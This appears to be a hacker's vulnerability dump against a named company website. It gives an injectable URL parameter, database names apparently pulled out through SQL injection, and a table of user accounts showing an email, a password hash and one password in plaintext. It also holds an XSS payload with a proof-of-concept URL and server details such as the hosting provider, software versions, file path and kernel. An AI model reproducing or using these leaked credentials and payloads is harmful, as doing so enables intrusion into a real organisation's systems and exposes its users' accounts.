.com 	Commercial

IT Services and Software Development company - BlueboxInfosoft Pvt. Ltd.

http://www.blueboxinfosoft.com/careers/job.php?id=16

available databases [5]:                                                                                                                                             
[+] information_schema
[+] itsguru_blueboxi_blueboxinfosoft
[+] itsguru_blueboxi_blueboxphp
[+] itsguru_blueboxi_tweetshare_api
[+] itsguru_blueboxi_wp

+----------+-----------------------------+----------------------------------+
| UserName | Email                       | Password                         |
+----------+-----------------------------+----------------------------------+
| admin    | contact@blueboxinfosoft.com | 2d6259a63c86c2efec54e9ff68dbc9c0 |
| uhpatel  |                             | !India@2141                      |
+----------+-----------------------------+----------------------------------+

[+] Payload: <input type="hidden" name="job_id" value="">Xss<svg/onload=confirm(/Xss/)>web">

[*] POC: http://www.blueboxinfosoft.com/careers/job.php?id=<input type="hidden" name="job_id" value="">Xss<svg/onload=confirm(/Xss/)>web">


A2 Hosting, Inc.

LiteSpeed V7.6

/home/itsguru/public_html/

webmaster@blueboxinfosoft.com

MariaDB

PostgreSQL 9.2.24 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit

Linux server.blueboxinfosoft.com 2.6.32-042stab141.3 #1 SMP Fri Nov 15 22:45:34 MSK 2019 x86_64


